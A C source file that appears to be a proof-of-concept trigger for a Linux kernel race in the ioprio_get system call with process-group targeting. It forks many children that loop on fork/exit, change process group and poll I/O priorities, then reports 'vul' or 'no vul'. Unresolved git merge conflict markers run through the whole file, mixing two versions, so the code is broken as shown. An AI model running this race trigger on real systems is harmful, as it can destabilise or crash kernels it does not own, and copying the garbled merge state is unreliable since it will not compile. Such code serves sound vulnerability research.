#include <assert.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <errno.h>
#include <sys/types.h>
#include <signal.h>
<<<<<<< HEAD

#define FORK_EXIT_CHILD  3
#define GET_IOPRIO_CHILD 3
#define FACK_IOPRIO_CHILD 2
#define TIMEOUT 200
=======
>>>>>>> cceca34162ff17abbbbac70d9d4701db45a1b88c
enum {
	IOPRIO_CLASS_NONE,
	IOPRIO_CLASS_RT,
	IOPRIO_CLASS_BE,
	IOPRIO_CLASS_IDLE,
};

enum {
	IOPRIO_WHO_PROCESS = 1,
	IOPRIO_WHO_PGRP,
	IOPRIO_WHO_USER,
};

<<<<<<< HEAD

enum {
	FORK_EXIT_LOOP,
	GET_IOPRIO_LOOP,
	FACK_IOPRIO_LOOP,
};
=======
>>>>>>> cceca34162ff17abbbbac70d9d4701db45a1b88c
int read_fd;
int write_fd;

#define change_pgid() setpgid(getpid(),0)

static int _ioprio_set(int which, int who, int prio ){
	return syscall(__NR_ioprio_set,which,who,prio);
}

static int _ioprio_get(int which ,int who){
	return syscall(__NR_ioprio_get,which,who);
}

// one child : fork and exit 
// one child : get
// one child : change pgid --> fork and exit


<<<<<<< HEAD
static void fork_exit_loop(){
=======
static void child1(){
>>>>>>> cceca34162ff17abbbbac70d9d4701db45a1b88c
	int pid;
	int ret;
	for(;;){
		pid = fork();
		if(pid == 0){
			exit(0);
		}else{
			waitpid(pid,NULL,0);
			//assert(ret == pid);
		}
	}
	exit(0);
}

<<<<<<< HEAD
static void get_ioprio_loop(){
=======
static void child2(){
>>>>>>> cceca34162ff17abbbbac70d9d4701db45a1b88c
	int prio;
	int OK = 1;
	time_t time_start = time(NULL),time_end;
	for(;;){
		prio = _ioprio_get(IOPRIO_WHO_PGRP,0);
<<<<<<< HEAD
		//printf("child prio : %x\n",prio);
		if(prio != 0x6000 && prio !=4){ //&& prio != 0){
			time_end = time(NULL);
			printf("%d %d\n",prio,time_end-time_start);
=======
	//	printf("child prio : %x\n",prio);
		if(prio != 0x6000  && prio !=4){
			time_end = time(NULL);
			printf("%d\n",time_end-time_start);
>>>>>>> cceca34162ff17abbbbac70d9d4701db45a1b88c
			write(write_fd,&OK,sizeof(OK));
		}
		//usleep(100);
	}
	exit(0);
}

<<<<<<< HEAD
static void fack_ioprio_loop(){
	int pid;
	int ret = change_pgid();
	if(ret == -1){
		perror("fack_ioprio_loop");
	}
	_ioprio_set(IOPRIO_WHO_PROCESS,0,0x4000);
	for(;;){
		ret = _ioprio_get(IOPRIO_WHO_PGRP,0);
		if(ret != 0x4000){
			printf("fack: %d\n",ret);
		}
=======
static void child3(){
	int ret = change_pgid();
	int pid;
	if(ret == -1){
		perror("child3");
	}
	_ioprio_set(IOPRIO_WHO_PROCESS,0,0);
	for(;;){
>>>>>>> cceca34162ff17abbbbac70d9d4701db45a1b88c
		pid = fork();
		if(pid == 0){
			exit(0);
		}else{
<<<<<<< HEAD
			waitpid(pid,NULL,0);
=======
			ret = wait(NULL);
			waitpid(pid,NULL,0);
			//assert(ret == pid);
>>>>>>> cceca34162ff17abbbbac70d9d4701db45a1b88c
		}
	}
	exit(0);
}

<<<<<<< HEAD
static void time_control(){
	int count = 0;
	int FAIL = -1;
	for(;count < TIMEOUT;count++){
		sleep(1);
	}
	write(write_fd,&FAIL,sizeof(FAIL));
	exit(0);
}

static int fork_and_run(int flag){
	int pid;
	pid = fork();
	assert(pid != -1);
	if(pid == 0){
		switch(flag){
			case FORK_EXIT_LOOP : 
				fork_exit_loop();
				break;
			case GET_IOPRIO_LOOP :
				get_ioprio_loop();
				break;
			case FACK_IOPRIO_LOOP :
				fack_ioprio_loop();
				break;
			default:
				exit(0);
		}
	}
	return pid;
}


int main(){
	int prio;
	int fork_exit_pid[FORK_EXIT_CHILD],get_ioprio_pid[GET_IOPRIO_CHILD],fack_ioprio_pid[FACK_IOPRIO_CHILD];
	int pipe_fd[2];
	int i,val;
=======
static void child4(){
	int count = 0;
	for(;;count++){
		sleep(1);
		printf("%d\n",count);
	}
	exit(0);
}

int main(){
	int prio;
	int pid[6] = {0};
	int pipe_fd[2];
>>>>>>> cceca34162ff17abbbbac70d9d4701db45a1b88c
	if(pipe(pipe_fd) == -1){
		perror("pipe");
		return -1;
	}
	read_fd = pipe_fd[0];
	write_fd = pipe_fd[1];
	_ioprio_set(IOPRIO_WHO_PROCESS,0,0x6000);

<<<<<<< HEAD
	for(i = 0; i < FORK_EXIT_CHILD; i++)
		fork_exit_pid[i] = fork_and_run(FORK_EXIT_LOOP);

	for(i = 0; i < GET_IOPRIO_CHILD; i++)
		get_ioprio_pid[i] = fork_and_run(GET_IOPRIO_LOOP);

	for(i = 0; i < FACK_IOPRIO_CHILD; i++)
		fack_ioprio_pid[i] = fork_and_run(FACK_IOPRIO_LOOP);

	if(fork()==0){
		time_control();
	}

	read(read_fd,&val,sizeof(val));
	printf("read pipe %d\n",val);
	if(val == 1){
		printf("done! vul\n");
	}else if(val == -1){
		printf("done! no vul\n");
	}
	for(i = 0; i < FORK_EXIT_CHILD; i++)
		kill(fork_exit_pid[i],SIGKILL);

	for(i = 0; i < GET_IOPRIO_CHILD; i++)
		kill(get_ioprio_pid[i],SIGKILL);

	for(i = 0; i < FACK_IOPRIO_CHILD; i++)
		kill(fack_ioprio_pid[i],SIGKILL);
	sleep(1);
	close(read_fd);
	close(write_fd);
=======
	pid[0] = fork();
	if(pid[0] == 0){
		child1();
		//sleep(1);
		// exit(0);
	}

	pid[1] = fork();
	if(pid[1] == 0){
		child2();
		//sleep(1);
		// exit(0);
	}

	pid[2] = fork();
	if(pid[2] == 0){
		child2();
		// exit(0);
	}

	pid[3] = fork();
	if(pid[3] == 0){
		child3();
		//exit(0);
	}

	pid[4] = fork();
	if(pid[4] == 0){
		child3();
		//exit(0);
	}

	pid[5] = fork();
	if(pid[5] == 0){
		child3();
		//exit(0);
	}

	int val,i;
	read(read_fd,&val,sizeof(val));
	printf("read pipe %d\n",val);
	if(val == 1){
		printf("done!\n");


	}
	for(i=0;i<6;i++)
		kill(pid[i],SIGKILL);
	close(read_fd);
	close(write_fd);
	// time_t start,end;
	// start = time(NULL);
	// while(1){
	// 	//_ioprio_set(IOPRIO_WHO_PROCESS,0,0);
	// 	prio = _ioprio_get(IOPRIO_WHO_PGRP,0);
	// 	//printf("father prio :%x\n",prio);
	// 	if(prio != 4 && prio != 0x6000){
	// 		end = time(NULL);
	// 		printf("time spent:%d\n",end-start);
	// 	}
	// 	//usleep(100);
	// }
>>>>>>> cceca34162ff17abbbbac70d9d4701db45a1b88c
	return 0;
}